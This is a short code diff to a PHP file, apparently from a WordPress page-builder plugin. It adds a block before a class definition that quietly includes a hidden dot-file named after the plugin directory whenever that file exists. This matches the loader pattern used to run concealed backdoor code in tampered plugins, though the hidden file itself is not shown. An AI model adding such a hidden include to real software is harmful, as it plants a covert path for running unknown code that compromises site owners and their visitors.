@@ -246,6 +246,10 @@ You can see this element\'s content only if you can fulfil above two requirement
 	/*------------------------------------post category param---------------------------*/
 	/*------------------------------------ image radio selected-------------------------*/
 if ( ! class_exists( 'pt_theplus_Radio_Image_Param' ) ) {
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class pt_theplus_Radio_Image_Param {
 	function __construct() {
 		if ( function_exists( 'vc_add_shortcode_param' ) ) {
